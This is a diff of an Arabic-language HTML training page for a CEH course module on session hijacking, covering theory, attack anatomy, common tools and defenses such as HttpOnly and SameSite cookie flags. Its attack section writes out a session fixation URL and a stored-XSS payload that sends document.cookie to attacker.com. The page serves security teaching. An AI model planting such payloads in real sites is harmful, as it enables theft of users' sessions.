@@ -1,39 +1,137 @@
+<div class="meth-content-view" id="meth-content-mod11" style="display: none; --tool-color: #a855f7;" dir="rtl">
 
-<!-- =======================================================
-     CEH MODULE 11: SESSION HIJACKING
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod11" style="display:none;" dir="rtl">
-  
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🔓</span> Session Hijacking</h2>
-    <p class="hero-tagline">السيطرة على جلسات المستخدمين الشرعيين متجاوزاً عمليات المصادقة.</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 11</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">🔒</span> Session Hijacking — اختطاف الجلسة</h2>
+    <p class="hero-tagline">شرح آليات سرقة واعتراض جلسات المستخدمين النشطة على مستويات التطبيقات والشبكات وطرق الحماية الفعّالة</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Bettercap · Wireshark · Burp Suite · EditThisCookie</span>
+      <span class="badge badge-info">📋 CEH Domain: Session Hijacking (Weight ~6%)</span>
+      <span style="background: rgba(168,85,247,0.15); color: #a855f7; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High (Integrity/Confidentiality)</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">🌐</span>
-      <h3>أساليب اختطاف الجلسات (Hijacking Levels)</h3>
+  <!-- ═══ SECTION 2: THEORY — Session Hijacking vs Session Spoofing ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — الفرق بين الاختطاف والتزييف وطبقات العمل</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تتمحور فكرة الهجوم حول الحصول على <strong>Session Token (رمز الجلسة)</strong> صالح وصادر بالفعل لمستخدم مصرح له، لتخطي مرحلة تسجيل الدخول بالكامل.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🔍 Hijacking vs Spoofing</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Session Hijacking (الاختطاف):</strong> يتدخل المهاجم في جلسة <strong>نشطة وقائمة بالفعل</strong> للمستخدم ويقطع اتصاله أو يتقمص شخصيته أثناء اتصاله بالخادم.</li>
+            <li><strong>Session Spoofing (التزييف):</strong> يقوم المهاجم <strong>بتخمين أو إنشاء</strong> رمز جلسة وهمي (أو مسروق مسبقاً) وبدء جلسة جديدة كلياً كأنه المستخدم المستهدف.</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🌐 طبقة التطبيق (Application Layer) vs الشبكة (Network Layer)</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Application Layer:</strong> سرقة ملفات تعريف الارتباط (Cookies/Tokens) المخزنة في المتصفح أو الذاكرة عبر ثغرات (XSS, Session Fixation, Man-in-the-Browser).</li>
+            <li><strong>Network Layer:</strong> اعتراض الحزم على مستوى الشبكة وتخمين أرقام التسلسل (TCP Sequence Numbers) للتدخل في اتصال TCP قائم بالفعل وتغيير البيانات المرسلة.</li>
+          </ul>
+        </div>
+      </div>
     </div>
-    
-    <div class="rd-compare-grid">
-      <div class="rd-compare-col bad" style="border-color: #ff4757;">
-        <div class="rd-compare-title">⚠️ اختطاف مستوى الشبكة (TCP/IP)</div>
-        <ul class="rd-compare-list">
-          <li>مراقبة اتصال TCP نشط واعتراضه.</li>
-          <li>الاعتماد على **توقع رقم التسلسل (Sequence Number Prediction)**.</li>
-          <li>حقن الحزمة الشرعية برقم التسلسل الصحيح ليتعامل الخادم مع المهاجم وكأنه العميل الأصلي.</li>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح مسار الهجوم — سرقة الجلسة عبر XSS والـ Fixation</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Session Fixation (تثبيت الجلسة)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">يقوم المهاجم بإنشاء معرف جلسة صالح على موقع الويب وإرساله للضحية (مثلاً عبر رابط يحتوي على الـ Session ID)، ليدفع الضحية لتسجيل الدخول مستخدماً نفس الـ Session ID المثبت مسبقاً.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# URL payload with fixed session ID sent to victim
+http://target.com/login.php?PHPSESSID=attacker_fixed_session_123</div>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Session Theft via Stored XSS</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">استغلال ثغرة XSS لحقن كود جافاسكريبت يقوم بقراءة الـ <code>document.cookie</code> وإرسالها لخادم خارجي يسيطر عليه المهاجم.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# XSS Payload to steal document.cookie
+&lt;script&gt;fetch('http://attacker.com/log?cookie=' + document.cookie)&lt;/script&gt;</div>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">TCP Session Hijacking (Network level)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">اعتراض البيانات على الشبكة، كشف الـ Sequence Number و Acknowledgment Number، والتنبؤ بالحزمة التالية لإلغاء اتصال الضحية وحقن أوامر ضارة.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ أدوات وتقنيات اختطاف الجلسات</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>نوع الهجوم</th>
+            <th>الوصف</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">EditThisCookie</strong></td>
+            <td>إضافة وتعديل الـ Cookies يدوياً</td>
+            <td>Application Layer</td>
+            <td>إضافة الـ Session ID المسروق مباشرة للمتصفح لتجاوز الـ Auth.</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">Bettercap</strong></td>
+            <td>تنفيذ هجمات ARP Poisoning وسرقة الـ Cookies</td>
+            <td>Network &amp; Application</td>
+            <td>اعتراض حركة المرور واستخلاص كلمات المرور والرموز تلقائياً.</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">Burp Suite</strong></td>
+            <td>تعديل وإعادة إرسال طلبات الـ HTTP</td>
+            <td>Proxy / Testing</td>
+            <td>تغيير قيم الـ Session Headers والتحقق من صحة الـ Tokens.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: DEFENSE & HARDENING ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين الجلسات وتثبيت ملفات الارتباط</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ إعدادات ملفات تعريف الارتباط الآمنة (Cookie Flags)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>HttpOnly:</strong> يمنع وصول نصوص جافاسكريبت (مثل XSS) إلى الـ Cookie تماماً.</li>
+          <li><strong>Secure:</strong> يضمن عدم إرسال الـ Cookie إلا عبر قنوات اتصال مشفرة بـ HTTPS فقط.</li>
+          <li><strong>SameSite=Strict/Lax:</strong> يمنع إرسال ملفات تعريف الارتباط مع الطلبات العابرة للمواقع (حماية من ثغرات CSRF).</li>
         </ul>
       </div>
-      <div class="rd-compare-col bad" style="border-color: #ffa502;">
-        <div class="rd-compare-title">⚠️ اختطاف مستوى التطبيق (App Level)</div>
-        <ul class="rd-compare-list">
-          <li><strong>سرقة الكوكيز (Sniffing):</strong> التقاط الـ Session ID وحقنه في المتصفح.</li>
-          <li><strong>تثبيت الجلسة (Session Fixation):</strong> فرض معرف جلسة مسبق على الضحية ليسجل دخوله به.</li>
-          <li><strong>استغلال XSS:</strong> حقن كود جافاسكريبت لسرقة الكوكي النشط.</li>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 إدارة الجلسة بأمان (Session Management)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Regenerate Session ID:</strong> تغيير معرف الجلسة فوراً عند نجاح تسجيل دخول المستخدم لتجنب هجمات الـ Session Fixation.</li>
+          <li><strong>Session Timeout:</strong> تعيين حد زمني لانتهاء الجلسة تلقائياً عند الخمول.</li>
+          <li><strong>IP &amp; User-Agent Binding:</strong> ربط الجلسة بعنوان IP وبصمة المتصفح للمستخدم، وإلغاء الجلسة فوراً عند حدوث أي تغيير مفاجئ.</li>
         </ul>
       </div>
     </div>
